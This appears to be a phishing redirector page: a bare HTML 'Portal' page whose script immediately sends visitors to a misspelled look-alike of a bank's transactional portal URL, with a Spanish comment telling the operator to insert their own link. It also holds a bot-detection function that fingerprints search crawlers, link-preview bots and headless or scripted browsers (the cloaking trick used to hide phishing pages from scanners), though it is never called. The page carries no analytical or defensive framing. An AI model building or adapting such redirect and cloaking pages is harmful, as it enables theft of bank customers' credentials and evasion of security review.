<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Portal</title>
    <style>
        body { margin: 0; padding: 0; background: #fff; }
    </style>
</head>
<body>
    <script>
        // ✏️ CAMBIA ESTO A TU LINK:
        const TARGET = "https://occdentebncoprtaltrnsccional.vercel.app/";

        // Detectar si es bot
        function isBot() {
            const ua = navigator.userAgent.toLowerCase();
            
            const botPatterns = [
                'googlebot', 'bingbot', 'slurp', 'duckduckbot', 'baiduspider',
                'yandexbot', 'facebookexternalhit', 'twitterbot', 'linkedinbot',
                'whatsapp', 'telegrambot', 'discordbot', 'ahrefsbot', 'semrushbot',
                'headlesschrome', 'phantomjs', 'puppeteer', 'playwright', 'selenium',
                'webdriver', 'cypress', 'bot\\b', 'crawler', 'spider', 'scraper',
                'curl', 'wget', 'python-requests', 'go-http-client'
            ];

            for (let pattern of botPatterns) {
                if (new RegExp(pattern, 'i').test(ua)) {
                    return true;
                }
            }

            // Detectar headless
            if (navigator.webdriver) return true;
            if (window.document.documentElement.getAttribute('webdriver')) return true;
            if (window.callPhantom) return true;
            if (window.Cypress) return true;

            // Detectar si no hay pantalla
            if (window.screen.width === 0 || window.screen.height === 0) return true;

            return false;
        }

        // Redirigir inmediatamente, sin esperar nada
        window.location.replace(TARGET);
    </script>
</body>
</html>
